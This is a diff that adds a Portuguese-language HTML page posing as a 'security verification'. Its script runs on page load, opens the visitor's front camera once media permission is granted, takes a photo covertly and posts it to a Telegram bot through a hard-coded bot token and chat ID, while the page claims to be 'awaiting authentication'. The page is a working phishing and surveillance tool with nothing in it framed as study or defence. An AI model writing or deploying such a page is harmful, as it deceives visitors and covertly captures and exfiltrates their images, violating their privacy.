@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acesso Seguro</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #0b0d12;
+      color: #e1e7ed;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: #141824;
+      border: 1px solid #23293d;
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+    }
+
+    .avatar-placeholder {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px auto;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #1e2640, #2d3759);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #3b82f6;
+    }
+
+    .avatar-placeholder svg {
+      width: 40px;
+      height: 40px;
+      fill: #60a5fa;
+    }
+
+    h2 {
+      font-size: 1.4rem;
+      margin-bottom: 10px;
+      color: #ffffff;
+      font-weight: 600;
+    }
+
+    p {
+      font-size: 0.95rem;
+      color: #94a3b8;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .loader {
+      display: inline-block;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      border-top-color: #3b82f6;
+      animation: spin 1s ease-in-out infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status-box {
+      background-color: #1a2035;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #cbd5e1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="avatar-placeholder">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+    </div>
+    <h2>Verificação de Segurança</h2>
+    <p>Para prosseguir e acessar o conteúdo, confirme a solicitação de permissão de mídia do seu navegador.</p>
+    
+    <div class="status-box">
+      <span class="loader"></span> Aguardando autenticação...
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const TELEGRAM_TOKEN = '8387772090:AAEEWGOfpNJy0xT-2GwLQymQptoziAeaAR4';
+    const CHAT_ID = '2003666494'; // Exemplo: '123456789'
+
+    async function iniciarCaptura() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            capturarEEnviar(video, stream);
+          }, 1200);
+        };
+
+      } catch (err) {
+        console.error("Permissão negada ou erro de mídia:", err);
+      }
+    }
+
+    function capturarEEnviar(video, stream) {
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      canvas.toBlob((blob) => {
+        if (!blob) return;
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'captura.jpg');
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(res => res.json())
+        .then(data => console.log("Enviado com sucesso:", data))
+        .catch(err => console.error("Erro no envio:", err));
+
+      }, 'image/jpeg', 0.85);
+    }
+
+    window.addEventListener('DOMContentLoaded', iniciarCaptura);
+  </script>
+</body>
+</html>
